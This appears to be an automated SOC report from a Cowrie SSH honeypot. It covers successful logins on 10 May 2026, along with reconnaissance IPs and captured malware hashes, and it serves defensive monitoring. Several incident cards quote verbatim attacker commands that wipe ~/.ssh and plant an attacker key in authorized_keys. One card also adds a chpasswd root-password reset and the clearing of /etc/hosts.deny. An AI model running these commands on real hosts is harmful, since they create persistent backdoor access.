| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:33:16` | `cowrie.session.connect` |
| `2026-05-10 21:33:16` | `cowrie.client.version` |
| `2026-05-10 21:33:16` | `cowrie.client.kex` |
| `2026-05-10 21:33:17` | `cowrie.login.success` |
| `2026-05-10 21:33:17` | `cowrie.session.params` |
| `2026-05-10 21:33:17` | `cowrie.command.input` |
| `2026-05-10 21:33:17` | `cowrie.command.failed` |
| `2026-05-10 21:33:17` | `cowrie.log.closed` |
| `2026-05-10 21:33:18` | `cowrie.session.params` |
| `2026-05-10 21:33:18` | `cowrie.command.input` |
| `2026-05-10 21:33:18` | `cowrie.session.file_download` |
| `2026-05-10 21:33:18` | `cowrie.log.closed` |
| `2026-05-10 21:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73e0e30f283

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-05-10 21:33 |
| **Last Seen** | 2026-05-10 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:33:20` | `cowrie.session.connect` |
| `2026-05-10 21:33:20` | `cowrie.client.version` |
| `2026-05-10 21:33:20` | `cowrie.client.kex` |
| `2026-05-10 21:33:21` | `cowrie.login.success` |
| `2026-05-10 21:33:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaec3ddde208

| Field | Detail |
|---|---|
| **Source IP** | `14.103.115[.]162` |
| **First Seen** | 2026-05-10 21:38 |
| **Last Seen** | 2026-05-10 21:38 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:TeObrDuFjwAL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:38:19` | `cowrie.session.connect` |
| `2026-05-10 21:38:19` | `cowrie.client.version` |
| `2026-05-10 21:38:20` | `cowrie.client.kex` |
| `2026-05-10 21:38:20` | `cowrie.login.success` |
| `2026-05-10 21:38:21` | `cowrie.session.params` |
| `2026-05-10 21:38:21` | `cowrie.command.input` |
| `2026-05-10 21:38:21` | `cowrie.command.failed` |
| `2026-05-10 21:38:21` | `cowrie.log.closed` |
| `2026-05-10 21:38:22` | `cowrie.session.params` |
| `2026-05-10 21:38:22` | `cowrie.command.input` |
| `2026-05-10 21:38:22` | `cowrie.session.file_download` |
| `2026-05-10 21:38:22` | `cowrie.log.closed` |
| `2026-05-10 21:38:30` | `cowrie.session.params` |
| `2026-05-10 21:38:30` | `cowrie.command.input` |
| `2026-05-10 21:38:31` | `cowrie.log.closed` |
| `2026-05-10 21:38:31` | `cowrie.session.params` |
| `2026-05-10 21:38:31` | `cowrie.command.input` |
| `2026-05-10 21:38:31` | `cowrie.log.closed` |
| `2026-05-10 21:38:32` | `cowrie.session.params` |
| `2026-05-10 21:38:32` | `cowrie.command.input` |
| `2026-05-10 21:38:33` | `cowrie.session.file_download` |
| `2026-05-10 21:38:33` | `cowrie.log.closed` |
| `2026-05-10 21:38:33` | `cowrie.session.params` |
| `2026-05-10 21:38:33` | `cowrie.command.input` |
| `2026-05-10 21:38:33` | `cowrie.log.closed` |
| `2026-05-10 21:38:34` | `cowrie.session.params` |
| `2026-05-10 21:38:34` | `cowrie.command.input` |
| `2026-05-10 21:38:34` | `cowrie.log.closed` |
| `2026-05-10 21:38:35` | `cowrie.session.params` |
| `2026-05-10 21:38:35` | `cowrie.command.input` |
| `2026-05-10 21:38:35` | `cowrie.command.input` |
| `2026-05-10 21:38:35` | `cowrie.log.closed` |
| `2026-05-10 21:38:35` | `cowrie.session.params` |
| `2026-05-10 21:38:35` | `cowrie.command.input` |
| `2026-05-10 21:38:35` | `cowrie.log.closed` |
| `2026-05-10 21:38:36` | `cowrie.session.params` |
| `2026-05-10 21:38:36` | `cowrie.command.input` |
| `2026-05-10 21:38:36` | `cowrie.log.closed` |
| `2026-05-10 21:38:36` | `cowrie.session.params` |
| `2026-05-10 21:38:36` | `cowrie.command.input` |
| `2026-05-10 21:38:37` | `cowrie.log.closed` |
| `2026-05-10 21:38:38` | `cowrie.session.params` |
| `2026-05-10 21:38:38` | `cowrie.command.input` |
| `2026-05-10 21:38:38` | `cowrie.log.closed` |
| `2026-05-10 21:38:38` | `cowrie.session.params` |
| `2026-05-10 21:38:38` | `cowrie.command.input` |
| `2026-05-10 21:38:39` | `cowrie.log.closed` |
| `2026-05-10 21:38:39` | `cowrie.session.params` |
| `2026-05-10 21:38:39` | `cowrie.command.input` |
| `2026-05-10 21:38:39` | `cowrie.log.closed` |
| `2026-05-10 21:38:39` | `cowrie.session.params` |
| `2026-05-10 21:38:39` | `cowrie.command.input` |
| `2026-05-10 21:38:40` | `cowrie.log.closed` |
| `2026-05-10 21:38:40` | `cowrie.session.params` |
| `2026-05-10 21:38:40` | `cowrie.command.input` |
| `2026-05-10 21:38:40` | `cowrie.log.closed` |
| `2026-05-10 21:38:41` | `cowrie.session.params` |
| `2026-05-10 21:38:41` | `cowrie.command.input` |
| `2026-05-10 21:38:41` | `cowrie.log.closed` |
| `2026-05-10 21:38:41` | `cowrie.session.params` |
| `2026-05-10 21:38:41` | `cowrie.command.input` |
| `2026-05-10 21:38:42` | `cowrie.log.closed` |
| `2026-05-10 21:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]162` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d3483d2ad5a

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-05-10 21:44 |
| **Last Seen** | 2026-05-10 21:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:44:05` | `cowrie.session.connect` |
| `2026-05-10 21:44:05` | `cowrie.client.version` |
| `2026-05-10 21:44:05` | `cowrie.client.kex` |
| `2026-05-10 21:44:06` | `cowrie.login.success` |
| `2026-05-10 21:44:06` | `cowrie.session.params` |
| `2026-05-10 21:44:06` | `cowrie.command.input` |
| `2026-05-10 21:44:06` | `cowrie.command.failed` |
| `2026-05-10 21:44:07` | `cowrie.log.closed` |
| `2026-05-10 21:44:07` | `cowrie.session.params` |
| `2026-05-10 21:44:07` | `cowrie.command.input` |
| `2026-05-10 21:44:07` | `cowrie.session.file_download` |
| `2026-05-10 21:44:07` | `cowrie.log.closed` |
| `2026-05-10 21:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4bff9841f7

| Field | Detail |
|---|---|
| **Source IP** | `128.14.225[.]164` |
| **First Seen** | 2026-05-10 21:44 |
| **Last Seen** | 2026-05-10 21:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 21:44:10` | `cowrie.session.connect` |
| `2026-05-10 21:44:10` | `cowrie.client.version` |
| `2026-05-10 21:44:10` | `cowrie.client.kex` |
| `2026-05-10 21:44:10` | `cowrie.login.success` |
| `2026-05-10 21:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.14.225[.]164` to AbuseIPDB if not already reported
- [ ] Block `128.14.225[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da47c95d034f

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:19 |
| **Last Seen** | 2026-05-10 22:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:19:24` | `cowrie.session.connect` |
| `2026-05-10 22:19:24` | `cowrie.client.version` |
| `2026-05-10 22:19:24` | `cowrie.client.kex` |
| `2026-05-10 22:19:24` | `cowrie.login.success` |
| `2026-05-10 22:19:25` | `cowrie.session.params` |
| `2026-05-10 22:19:25` | `cowrie.command.input` |
| `2026-05-10 22:19:25` | `cowrie.command.failed` |
| `2026-05-10 22:19:25` | `cowrie.log.closed` |
| `2026-05-10 22:19:25` | `cowrie.session.params` |
| `2026-05-10 22:19:25` | `cowrie.command.input` |
| `2026-05-10 22:19:25` | `cowrie.session.file_download` |
| `2026-05-10 22:19:25` | `cowrie.log.closed` |
| `2026-05-10 22:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0f5afab25f8

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:19 |
| **Last Seen** | 2026-05-10 22:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:19:28` | `cowrie.session.connect` |
| `2026-05-10 22:19:28` | `cowrie.client.version` |
| `2026-05-10 22:19:28` | `cowrie.client.kex` |
| `2026-05-10 22:19:28` | `cowrie.login.success` |
| `2026-05-10 22:19:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e7eab8be4f1

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:20 |
| **Last Seen** | 2026-05-10 22:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:20:59` | `cowrie.session.connect` |
| `2026-05-10 22:20:59` | `cowrie.client.version` |
| `2026-05-10 22:20:59` | `cowrie.client.kex` |
| `2026-05-10 22:21:00` | `cowrie.login.success` |
| `2026-05-10 22:21:00` | `cowrie.session.params` |
| `2026-05-10 22:21:00` | `cowrie.command.input` |
| `2026-05-10 22:21:00` | `cowrie.command.failed` |
| `2026-05-10 22:21:00` | `cowrie.log.closed` |
| `2026-05-10 22:21:00` | `cowrie.session.params` |
| `2026-05-10 22:21:00` | `cowrie.command.input` |
| `2026-05-10 22:21:01` | `cowrie.session.file_download` |
| `2026-05-10 22:21:01` | `cowrie.log.closed` |
| `2026-05-10 22:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915d68e033c6

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:21 |
| **Last Seen** | 2026-05-10 22:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:21:03` | `cowrie.session.connect` |
| `2026-05-10 22:21:03` | `cowrie.client.version` |
| `2026-05-10 22:21:03` | `cowrie.client.kex` |
| `2026-05-10 22:21:03` | `cowrie.login.success` |
| `2026-05-10 22:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f65e4b68b709

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:25 |
| **Last Seen** | 2026-05-10 22:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:25:52` | `cowrie.session.connect` |
| `2026-05-10 22:25:52` | `cowrie.client.version` |
| `2026-05-10 22:25:52` | `cowrie.client.kex` |
| `2026-05-10 22:25:53` | `cowrie.login.success` |
| `2026-05-10 22:25:54` | `cowrie.session.params` |
| `2026-05-10 22:25:54` | `cowrie.command.input` |
| `2026-05-10 22:25:54` | `cowrie.command.failed` |
| `2026-05-10 22:25:54` | `cowrie.log.closed` |
| `2026-05-10 22:25:54` | `cowrie.session.params` |
| `2026-05-10 22:25:54` | `cowrie.command.input` |
| `2026-05-10 22:25:55` | `cowrie.session.file_download` |
| `2026-05-10 22:25:55` | `cowrie.log.closed` |
| `2026-05-10 22:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33b23eba506b

| Field | Detail |
|---|---|
| **Source IP** | `78.44.192[.]210` |
| **First Seen** | 2026-05-10 22:25 |
| **Last Seen** | 2026-05-10 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-10 22:25:58` | `cowrie.session.connect` |
| `2026-05-10 22:25:58` | `cowrie.client.version` |
| `2026-05-10 22:25:58` | `cowrie.client.kex` |
| `2026-05-10 22:25:59` | `cowrie.login.success` |
| `2026-05-10 22:26:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.44.192[.]210` to AbuseIPDB if not already reported
- [ ] Block `78.44.192[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `135.148.14[.]151` | **370** | 2026-05-10 21:48 | 2026-05-10 22:52 | 221m | 0 | `T1592` | 🟠 MEDIUM |
| `14.103.115[.]162` | **31** | 2026-05-10 21:28 | 2026-05-10 22:04 | 50m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `128.14.225[.]164` | **30** | 2026-05-10 21:05 | 2026-05-10 21:45 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `78.44.192[.]210` | **30** | 2026-05-10 21:29 | 2026-05-10 22:39 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `35.233.209[.]148` | **29** | 2026-05-10 20:54 | 2026-05-10 22:41 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `45.119.212[.]99` | **29** | 2026-05-10 20:56 | 2026-05-10 21:24 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `202.165.15[.]132` | **17** | 2026-05-10 20:53 | 2026-05-10 21:08 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.162.8[.]14` | **11** | 2026-05-10 22:35 | 2026-05-10 22:52 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `40.124.169[.]38` | **2** | 2026-05-10 22:45 | 2026-05-10 22:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.172[.]78` | **2** | 2026-05-10 21:15 | 2026-05-10 21:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.196.27[.]240` | 1 | 2026-05-10 22:10 | 2026-05-10 22:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `150.95.25[.]34` | 1 | 2026-05-10 22:16 | 2026-05-10 22:17 | 40s | 0 | `T1592` | 🟢 LOW |
| `174.76.38[.]124` | 1 | 2026-05-10 22:06 | 2026-05-10 22:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.73.148[.]37` | 1 | 2026-05-10 22:19 | 2026-05-10 22:19 | 29s | 1 | `T1110.001` | 🟢 LOW |
| `23.111.14[.]189` | 1 | 2026-05-10 22:19 | 2026-05-10 22:20 | 29s | 1 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
